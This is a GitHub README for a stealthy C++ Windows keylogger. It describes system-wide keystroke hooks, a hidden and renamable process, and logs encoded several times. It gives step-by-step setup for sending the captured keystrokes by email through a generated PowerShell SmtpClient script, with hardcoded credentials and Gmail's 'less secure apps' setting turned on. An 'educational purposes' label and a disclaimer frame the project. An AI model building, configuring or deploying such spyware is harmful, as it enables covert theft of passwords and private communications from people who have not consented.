# Cpp-Keylogger (Completed)
Advanced keylogger made in C++ that works on Window 7, 8, 8.1, And 10 - **Use at your own discretion** <br/><br/>
This is a keylogger I learned from Udemy for educational purposes. Please do not use this code for illegal or immoral purposes and keep it open source! The project also includes a decryption program will accepts an encrypted log file and translates it to a human readable language. <br/>
If you would like to take the course yourself, check it out [here](https://www.udemy.com/how-to-create-an-advanced-keylogger-from-scratch-for-windows).

## Features
  * Lots of comments in each of the source files for the user
  * Low-resource usage/non-intensive process and generates no windows when ran
  * Asynchronous execution of processes
  * Capture all keystrokes using system hooks
  * Automatically log the time and date when a log file is produced
  * Uses Base64 encryption with slight modifications and encodes the log multiple times
  * Generates and invokes a powershell script that can attach the encrypted log and email it
  * Lots of customization options in the source code for user to modify:
    * Name of the process
    * Email to send from and send to
    * Time between each log file generation
    * When to enable and disable the keyboard hooks
    * Method of encryption used
    * Format which the keys are recorded

### Prerequisites

What things you need to install the software and how to install them

```
* Visual Studio preferably or any IDE of your choice
* C++11 standards must be enabled and if using GCC compilter, -mwindows flag needs to be checked

```

### Installing

A step by step series of examples that tell you have to get a development environment running

Download the repository using either bash or the browser

```
git clone https://github.com/htmercury/Cpp-Keylogger
```

Open the solution file in Visual Studio using the sln file

```
located at ../Cpp-Keylogger/Keylogger.sln
```

For other IDEs, make a project that includes all source and header files

```
located at ../Cpp-Keylogger/Keylogger
```

## Setting it up
Listed below are various options the user can interact with the source code for their specific usage.

### Email
Required if user wants the log to be sent to an email.

Open SendMail.h
```
located at ../Cpp-Keylogger/Keylogger/SendMail.h
```
Edit line 16 for where the log should be sent from (default: gmail only, look at Other Emails section for changing that)
```
line 16: #define X_EM_TO "our.destination@email.address" // change the string to source email
```
Edit line 17 for where the log should be sent to (can be same as above or any other email is fine)
```
line 17: #define X_EM_FROM "Address of sender" // change the string to destination email
```
Edit line 18 for powershell to login to source email (required for email to be sent)
```
line 18: X_EM_PASS "password" // change the string to password of source email
```
## Configuring the Source Email
For gmail, allow less secure apps access your source email so the program can construct and send the email.
The steps needed to do this is documented [here](https://support.google.com/accounts/answer/6010255?hl=en) on google support. <br/>
Refer to Other Emails section if the source email is not gmail.

**SKIP OTHER EMAILS SECTION IF SOURCE EMAIL IS GMAIL**

## Other Emails
OPTIONAL: If you want to use another email other than gmail as the source email, then follow these steps.

Open SendMail.h
```
located at ../Cpp-Keylogger/Keylogger/SendMail.h
```
Edit line 39 with your email port number which can be searched up
```
line 39: "           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
```

### Configuring Other Emails
Look up permissions respectively for your source email that allow less secure apps to access that source email.

## License
This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details

## Disclaimer
Any usage of this keylogger on a computer that is not owned by you or do not have permissions, **YOU ARE RESPONSIBLE FOR THE OUTCOME**. Not me.
